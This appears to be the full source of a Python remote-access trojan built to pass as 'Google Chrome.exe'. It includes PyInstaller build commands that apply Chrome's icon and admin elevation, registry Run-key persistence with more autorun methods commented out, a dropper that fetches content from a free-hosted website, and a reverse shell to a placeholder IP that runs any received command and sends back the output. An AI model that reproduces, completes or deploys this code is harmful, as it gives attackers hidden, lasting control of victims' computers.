# Feichangha0
# ###########
# Pyinstaller commands - first no admin, second with admin
# pyinstaller -F -w -i "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" "Google Chrome.py"
# pyinstaller --uac-admin -i "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -F -n "Google Chrome.exe" -w -r "Google Chrome.exe.mainfest,1" chrome.py

import os
import socket
import subprocess
import winreg
from shutil import copy
from urllib.request import urlopen, Request
from bs4 import BeautifulSoup


# ########### #
# Persistence #
# ########### #

# filename and hide location hardcoded
path = r'C:\Program Data\Google\Chrome\Application'
file = 'Google Chrome.exe'

# If path doesn't exist, create it and copy self there; for init run
if not os.path.exists(path):
    os.makedirs(path)
    copy(file, path)

# Autorun - create 'Chrome' key in HKCU - run on user login
reg_hkey = winreg.HKEY_CURRENT_USER
key = winreg.OpenKey(reg_hkey, f'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, 'Chrome', 0, winreg.REG_SZ, path + '\\' + file)
winreg.CloseKey(key)

# Extra sauce
#os.system(r'reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v chrome /d "C:\%userprofile%\Desktop\chrome.exe" /f')
#os.system(r'reg add "HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v chrome /d "C:\%userprofile%\Desktop\chrome.exe" /f')
#copy('chrome.exe', r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\chrome.exe')


path = r'C:\Program Data\Google\Chrome\Application'

# ############ #
#   Dropper    #
# ############ #

# get site html
try:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.3'}
    req = Request(url='https://xyzzy.my-free.website/111223', headers=headers)
    page = urlopen(req).read()
    # parse html, target relevant info
    soup = BeautifulSoup(page, 'html.parser')
    target = (soup.find('p', class_='section-description body--md mb-0'))
except:
    pass

# try reading the first line of temp.txt; if nonexistent - create one and initialize
try:
    f1 = open(path + r'\temp.txt', 'r+')
    current_ver = f1.read().split("\n")[0]
    f1.close()
    site_ver = list(target)[0]
    # compare versions; if sites is newer, update
    if current_ver[8:] < site_ver[8:]:
        f1 = open(path + r'\temp.txt', 'w')
        index = 0
        for i in list(target)[:-1]:
            if index % 2 == 0:
                f1.write(i + "\n")
            index += 1
        f1.close()
except:
    f1 = open(path + r'\temp.txt', 'w')
    f1.write('version 1')
    f1.close()

# ############# #
# Reverse Shell #
# ############# #

# open a socket to receive commands
IP = 'YOUR_IP_HERE'
PORT = 60606

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((IP, PORT))

while True:
    # receive string
    data_len = int(s2.recv(64).decode())  # receive data length
    data = s2.recv(data_len).decode()  # receive data
    # handle 'quit' command
    if data == "quit":
        break
    # carry out command
    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    # handle 'cd' command
    if data[:2] == 'cd' and len(data) > 2:
        os.chdir(data[3:])
    # return output
    output = (cmd.stdout.read() + cmd.stderr.read())
    if len(output) > 0:
        s2.send(str(len(str(output).encode())).encode())  # send output length
        s2.send(output)  # send output
    else:
        s2.send(str(len("ok".encode())).encode())  # send "ok" length
        s2.send("ok".encode())  # send "ok"

s2.close()
